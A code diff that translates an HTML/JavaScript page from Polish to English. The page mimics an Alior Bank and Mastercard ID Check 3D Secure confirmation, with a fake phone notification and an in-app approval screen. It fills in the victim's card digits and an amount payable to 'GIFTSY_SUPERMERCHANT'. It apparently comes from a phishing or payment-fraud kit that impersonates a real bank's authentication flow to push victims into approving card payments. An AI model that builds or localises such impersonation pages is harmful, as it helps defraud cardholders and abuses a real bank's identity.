@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="pl">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>3D Secure – Potwierdzenie Transakcji</title>
+<title>3D Secure – Transaction Confirmation</title>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
 
@@ -539,9 +539,9 @@ document.addEventListener('click',function(e){const btn=document.getElementById(
   <header class="desktop-header">
     <div class="header-left">
       <img class="alior-logo-img" src="icons/alior-bank-logo.svg" alt="Alior Bank">
-      <span class="lang-selector">Polski (Pols…&nbsp;▾</span>
+      <span class="lang-selector">English (Engl…&nbsp;▾</span>
     </div>
-    <span class="cancel-btn">ANULUJ</span>
+    <span class="cancel-btn">CANCEL</span>
     <div class="mastercard-logo">
       <div class="mc-wrap"><div class="mc-red"></div><div class="mc-yel"></div></div>
       <div class="mc-txt">mastercard<br>ID Check</div>
@@ -551,14 +551,14 @@ document.addEventListener('click',function(e){const btn=document.getElementById(
   <main class="desktop-main">
     <!-- waiting -->
     <div class="page-content" id="desk-wait">
-      <h1>Potwierdzenie Transakcji</h1>
-      <p>Na Twoje urządzenie do autoryzacji mobilnej wysłaliśmy powiadomienie dotyczące poniższej płatności.</p>
-      <p>Zweryfikuj i potwierdź tę płatność w <strong>aplikacji mobilnej Twojego Banku.</strong></p>
+      <h1>Transaction Confirmation</h1>
+      <p>We have sent a notification to your mobile authentication device regarding the following payment.</p>
+      <p>Verify and confirm this payment in <strong>your Bank's mobile app.</strong></p>
       <div class="tx-info" id="desk-txinfo">
-        <p>Sklep: GIFTSY_SUPERMERCHANT</p>
-        <p>Kwota: — EUR</p>
-        <p>Data: —</p>
-        <p>Numer karty: ************—</p>
+        <p>Merchant: GIFTSY_SUPERMERCHANT</p>
+        <p>Amount: — EUR</p>
+        <p>Date: —</p>
+        <p>Card number: ************—</p>
       </div>
       <div class="waiting-indicator">
         <div class="wi-dots">
@@ -567,21 +567,21 @@ document.addEventListener('click',function(e){const btn=document.getElementById(
           <div class="wi-dot" id="wd3"></div>
           <div class="wi-dot" id="wd4"></div>
         </div>
-        <p class="waiting-note">Oczekiwanie na potwierdzenie w aplikacji<span></span></p>
+        <p class="waiting-note">Waiting for confirmation in app<span></span></p>
       </div>
     </div>
 
     <!-- confirmed -->
     <div class="confirmed-wrap" id="desk-ok">
       <div class="confirmed-check">✓</div>
-      <h2>Płatność potwierdzona!</h2>
-      <p id="desk-ok-amount">Transakcja została autoryzowana.</p>
+      <h2>Payment confirmed!</h2>
+      <p id="desk-ok-amount">Transaction has been authorised.</p>
     </div>
   </main>
 
   <footer class="desktop-footer">
-    <div class="footer-row">Dowiedz się więcej <span class="footer-plus">+</span></div>
-    <div class="footer-row">Skontaktuj się z nami <span class="footer-plus">+</span></div>
+    <div class="footer-row">Learn more <span class="footer-plus">+</span></div>
+    <div class="footer-row">Contact us <span class="footer-plus">+</span></div>
   </footer>
 </div>
 
@@ -605,7 +605,7 @@ document.addEventListener('click',function(e){const btn=document.getElementById(
         </div>
         <div class="ls-lock">🔒</div>
         <div class="ls-time" id="phone-time">9:41</div>
-        <div class="ls-date" id="phone-date">wtorek, 18 lut</div>
+        <div class="ls-date" id="phone-date">Tuesday, 18 Feb</div>
         <div class="ls-bottom">
           <div class="ls-btn">🔦</div>
           <div class="ls-btn">📷</div>
@@ -619,8 +619,8 @@ document.addEventListener('click',function(e){const btn=document.getElementById(
           <img src="icons/alior-bank-logo.svg" alt="Alior Bank">
         </div>
         <div style="flex:1">
-          <div class="pn-title">Alior Bank – Potwierdź płatność</div>
-          <div class="pn-body" id="pn-body-text">Płatność — EUR w GIFTSY_SUPERMERCHANT wymaga potwierdzenia.</div>
+          <div class="pn-title">Alior Bank – Confirm payment</div>
+          <div class="pn-body" id="pn-body-text">Payment — EUR at GIFTSY_SUPERMERCHANT requires confirmation.</div>
         </div>
         <div class="pn-x">✕</div>
       </div>
@@ -629,28 +629,28 @@ document.addEventListener('click',function(e){const btn=document.getElementById(
       <div class="phone-auth" id="phone-auth">
         <div class="pa-head">
           <span style="color:white;font-size:17px;font-weight:800;letter-spacing:.5px;">ALIOR BANK</span>
-          <h2>Uwierzytelnienie operacji</h2>
+          <h2>Operation Authentication</h2>
         </div>
         <div class="pa-body">
           <div class="pa-banner">
             <svg width="13" height="13" viewBox="0 0 24 24" fill="#4a90d9" style="flex-shrink:0;margin-top:1px"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
-            <p>Nastąpiło automatyczne przekierowanie do aplikacji</p>
+            <p>You have been automatically redirected to the app</p>
           </div>
-          <div class="pa-row"><div class="pa-label">Szczegóły operacji</div><div class="pa-val" id="pa-detail-date">Operacja z dnia: —</div></div>
-          <div class="pa-row"><div class="pa-label">Rodzaj operacji</div><div class="pa-val">Transakcja kartą</div></div>
-          <div class="pa-row"><div class="pa-label">Nazwa karty</div><div class="pa-val" id="pa-card-name">Karta płatnicza</div></div>
-          <div class="pa-row"><div class="pa-label">Numer karty</div><div class="pa-val" id="pa-card-num">**** **** **** —</div></div>
-          <div class="pa-row"><div class="pa-label">Odbiorca</div><div class="pa-val">GIFTSY_SUPERMERCHANT</div></div>
-          <div class="pa-row"><div class="pa-label">Kwota</div><div class="pa-val" id="pa-amount">— EUR</div></div>
-          <div class="pa-row"><div class="pa-label">Data transakcji</div><div class="pa-val" id="pa-tx-date">—</div></div>
+          <div class="pa-row"><div class="pa-label">Operation details</div><div class="pa-val" id="pa-detail-date">Operation date: —</div></div>
+          <div class="pa-row"><div class="pa-label">Operation type</div><div class="pa-val">Card transaction</div></div>
+          <div class="pa-row"><div class="pa-label">Card name</div><div class="pa-val" id="pa-card-name">Payment card</div></div>
+          <div class="pa-row"><div class="pa-label">Card number</div><div class="pa-val" id="pa-card-num">**** **** **** —</div></div>
+          <div class="pa-row"><div class="pa-label">Recipient</div><div class="pa-val">GIFTSY_SUPERMERCHANT</div></div>
+          <div class="pa-row"><div class="pa-label">Amount</div><div class="pa-val" id="pa-amount">— EUR</div></div>
+          <div class="pa-row"><div class="pa-label">Transaction date</div><div class="pa-val" id="pa-tx-date">—</div></div>
         </div>
         <div class="pa-actions">
-          <button class="pa-confirm" onclick="desktopConfirm()">Zatwierdź</button>
-          <button class="pa-reject">Odrzuć</button>
+          <button class="pa-confirm" onclick="desktopConfirm()">Confirm</button>
+          <button class="pa-reject">Reject</button>
         </div>
         <div class="phone-success" id="phone-success">
           <div class="ps-check">✓</div>
-          <div class="ps-label" id="ps-label-text">Autoryzowano — EUR!</div>
+          <div class="ps-label" id="ps-label-text">Authorised — EUR!</div>
         </div>
       </div>
 
@@ -669,8 +669,8 @@ document.addEventListener('click',function(e){const btn=document.getElementById(
   </div>
 
   <div class="m-subbar">
-    <span class="m-lang">Polski (Pols…&nbsp;⇅</span>
-    <span class="m-cancel">ANULUJ</span>
+    <span class="m-lang">English (Engl…&nbsp;⇅</span>
+    <span class="m-cancel">CANCEL</span>
   </div>
 
   <div class="m-logos">
@@ -682,14 +682,14 @@ document.addEventListener('click',function(e){const btn=document.getElementById(
   </div>
 
   <div class="m-body">
-    <h1>Potwierdzenie Transakcji</h1>
-    <p>Na Twoje urządzenie do autoryzacji mobilnej wysłaliśmy powiadomienie dotyczące poniższej płatności.</p>
-    <p>Zweryfikuj i potwierdź tę płatność w <strong>aplikacji mobilnej Twojego Banku.</strong></p>
+    <h1>Transaction Confirmation</h1>
+    <p>We have sent a notification to your mobile authentication device regarding the following payment.</p>
+    <p>Verify and confirm this payment in <strong>your Bank's mobile app.</strong></p>
     <div class="m-txinfo" id="mob-txinfo">
-      <p>Sklep: GIFTSY_SUPERMERCHANT</p>
-      <p>Kwota: — EUR</p>
-      <p>Data: —</p>
-      <p>Numer karty: ************—</p>
+      <p>Merchant: GIFTSY_SUPERMERCHANT</p>
+      <p>Amount: — EUR</p>
+      <p>Date: —</p>
+      <p>Card number: ************—</p>
     </div>
     <div class="waiting-indicator">
       <div class="wi-dots">
@@ -698,13 +698,13 @@ document.addEventListener('click',function(e){const btn=document.getElementById(
         <div class="wi-dot" id="mwd3"></div>
         <div class="wi-dot" id="mwd4"></div>
       </div>
-      <p class="waiting-note">Oczekiwanie na potwierdzenie w aplikacji<span></span></p>
+      <p class="waiting-note">Waiting for confirmation in app<span></span></p>
     </div>
   </div>
 
   <div class="m-footer">
-    <div class="m-frow">Dowiedz się więcej <span class="m-fplus">+</span></div>
-    <div class="m-frow">Skontaktuj się z nami <span class="m-fplus">+</span></div>
+    <div class="m-frow">Learn more <span class="m-fplus">+</span></div>
+    <div class="m-frow">Contact us <span class="m-fplus">+</span></div>
   </div>
 
   <!-- push notification -->
@@ -713,8 +713,8 @@ document.addEventListener('click',function(e){const btn=document.getElementById(
       <img src="icons/alior-bank-logo.svg" alt="Alior Bank">
     </div>
     <div style="flex:1">
-      <div class="m-push-title">Alior Bank – Potwierdź płatność</div>
-      <div class="m-push-body" id="m-pn-body-text">Płatność — EUR w GIFTSY_SUPERMERCHANT wymaga potwierdzenia.</div>
+      <div class="m-push-title">Alior Bank – Confirm payment</div>
+      <div class="m-push-body" id="m-pn-body-text">Payment — EUR at GIFTSY_SUPERMERCHANT requires confirmation.</div>
     </div>
     <div class="m-push-x">✕</div>
   </div>
@@ -723,31 +723,31 @@ document.addEventListener('click',function(e){const btn=document.getElementById(
   <div class="m-auth" id="m-auth">
     <div class="m-ah">
       <span style="color:white;font-size:20px;font-weight:800;letter-spacing:.5px;">ALIOR BANK</span>
-      <h2>Uwierzytelnienie operacji</h2>
+      <h2>Operation Authentication</h2>
     </div>
     <div class="m-ab">
       <div class="m-abanner">
         <span style="font-size:19px;flex-shrink:0">ℹ️</span>
-        <p>Nastąpiło automatyczne przekierowanie do aplikacji</p>
+        <p>You have been automatically redirected to the app</p>
       </div>
-      <div class="m-det"><div class="m-dlabel">Szczegóły operacji</div><div class="m-dval" id="m-detail-date">Operacja z dnia: —</div></div>
-      <div class="m-det"><div class="m-dlabel">Rodzaj operacji</div><div class="m-dval">Transakcja kartą</div></div>
-      <div class="m-det"><div class="m-dlabel">Nazwa karty</div><div class="m-dval" id="m-card-name">Karta płatnicza</div></div>
-      <div class="m-det"><div class="m-dlabel">Numer karty</div><div class="m-dval" id="m-card-num">**** **** **** —</div></div>
-      <div class="m-det"><div class="m-dlabel">Odbiorca</div><div class="m-dval">GIFTSY_SUPERMERCHANT</div></div>
-      <div class="m-det"><div class="m-dlabel">Kwota</div><div class="m-dval" id="m-amount">— EUR</div></div>
-      <div class="m-det"><div class="m-dlabel">Data transakcji</div><div class="m-dval" id="m-tx-date">—</div></div>
+      <div class="m-det"><div class="m-dlabel">Operation details</div><div class="m-dval" id="m-detail-date">Operation date: —</div></div>
+      <div class="m-det"><div class="m-dlabel">Operation type</div><div class="m-dval">Card transaction</div></div>
+      <div class="m-det"><div class="m-dlabel">Card name</div><div class="m-dval" id="m-card-name">Payment card</div></div>
+      <div class="m-det"><div class="m-dlabel">Card number</div><div class="m-dval" id="m-card-num">**** **** **** —</div></div>
+      <div class="m-det"><div class="m-dlabel">Recipient</div><div class="m-dval">GIFTSY_SUPERMERCHANT</div></div>
+      <div class="m-det"><div class="m-dlabel">Amount</div><div class="m-dval" id="m-amount">— EUR</div></div>
+      <div class="m-det"><div class="m-dlabel">Transaction date</div><div class="m-dval" id="m-tx-date">—</div></div>
     </div>
     <div class="m-aa">
-      <button class="m-aok" onclick="mobileConfirm()">Zatwierdź</button>
-      <button class="m-ano">Odrzuć</button>
+      <button class="m-aok" onclick="mobileConfirm()">Confirm</button>
+      <button class="m-ano">Reject</button>
     </div>
   </div>
 
   <!-- success -->
   <div class="m-success" id="m-success">
     <div class="m-scheck">✓</div>
-    <div class="m-stitle">Płatność autoryzowana!</div>
+    <div class="m-stitle">Payment authorised!</div>
     <div class="m-ssub" id="m-ssub-text">— EUR · GIFTSY_SUPERMERCHANT</div>
   </div>
 
@@ -773,8 +773,8 @@ const todayFmt = `${dd}.${mm}.${yyyy}`;
 // Lock screen clock
 const hours = String(now.getHours()).padStart(2, '0');
 const mins  = String(now.getMinutes()).padStart(2, '0');
-const dayNames = ['niedziela','poniedziałek','wtorek','środa','czwartek','piątek','sobota'];
-const monthNames = ['sty','lut','mar','kwi','maj','cze','lip','sie','wrz','paź','lis','gru'];
+const dayNames = ['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'];
+const monthNames = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
 const lockDateStr = `${dayNames[now.getDay()]}, ${now.getDate()} ${monthNames[now.getMonth()]}`;
 
 const cardLast4 = payData.cardLast4 || '—';
@@ -789,10 +789,10 @@ const cardNumMasked = `************${cardLast4}`;
 
 // Card name based on brand
 const cardNameMap = {
-  'Visa':       'Karta Visa płatnicza',
-  'Mastercard': 'Karta Debit Mastercard zbliżeniowa',
+  'Visa':       'Visa payment card',
+  'Mastercard': 'Mastercard Debit contactless card',
 };
-const cardName = cardNameMap[cardBrand] || 'Karta płatnicza';
+const cardName = cardNameMap[cardBrand] || 'Payment card';
 
 const amountFull = `${amount} ${currency}`;
 
@@ -814,39 +814,39 @@ setText('phone-date', lockDateStr);
 
 // Desktop tx info block
 setHTML('desk-txinfo',
-  `<p>Sklep: GIFTSY_SUPERMERCHANT</p>` +
-  `<p>Kwota: ${amountFull}</p>` +
-  `<p>Data: ${todayFmt}</p>` +
-  `<p>Numer karty: ${cardNumMasked}</p>`
+  `<p>Merchant: GIFTSY_SUPERMERCHANT</p>` +
+  `<p>Amount: ${amountFull}</p>` +
+  `<p>Date: ${todayFmt}</p>` +
+  `<p>Card number: ${cardNumMasked}</p>`
 );
 
 // Desktop confirmed
-setText('desk-ok-amount', `Transakcja ${amountFull} została autoryzowana.`);
+setText('desk-ok-amount', `Transaction ${amountFull} has been authorised.`);
 
 // Push notification body (desktop phone)
-setText('pn-body-text', `Płatność ${amountFull} w GIFTSY_SUPERMERCHANT wymaga potwierdzenia w aplikacji Alior Bank.`);
+setText('pn-body-text', `Payment ${amountFull} at GIFTSY_SUPERMERCHANT requires confirmation in the Alior Bank app.`);
 
 // Phone auth screen
-setText('pa-detail-date', `Operacja z dnia: ${todayFmt}`);
+setText('pa-detail-date', `Operation date: ${todayFmt}`);
 setText('pa-card-name', cardName);
 setText('pa-card-num', cardNumDisplay);
 setText('pa-amount', amountFull);
 setText('pa-tx-date', todayFmt);
-setText('ps-label-text', `Autoryzowano ${amountFull}!`);
+setText('ps-label-text', `Authorised ${amountFull}!`);
 
 // Mobile tx info block
 setHTML('mob-txinfo',
-  `<p>Sklep: GIFTSY_SUPERMERCHANT</p>` +
-  `<p>Kwota: ${amountFull}</p>` +
-  `<p>Data: ${todayFmt}</p>` +
-  `<p>Numer karty: ${cardNumMasked}</p>`
+  `<p>Merchant: GIFTSY_SUPERMERCHANT</p>` +
+  `<p>Amount: ${amountFull}</p>` +
+  `<p>Date: ${todayFmt}</p>` +
+  `<p>Card number: ${cardNumMasked}</p>`
 );
 
 // Mobile push notification body
-setText('m-pn-body-text', `Płatność ${amountFull} w GIFTSY_SUPERMERCHANT wymaga potwierdzenia w aplikacji Alior Bank.`);
+setText('m-pn-body-text', `Payment ${amountFull} at GIFTSY_SUPERMERCHANT requires confirmation in the Alior Bank app.`);
 
 // Mobile auth screen
-setText('m-detail-date', `Operacja z dnia: ${todayFmt}`);
+setText('m-detail-date', `Operation date: ${todayFmt}`);
 setText('m-card-name', cardName);
 setText('m-card-num', cardNumDisplay);
 setText('m-amount', amountFull);
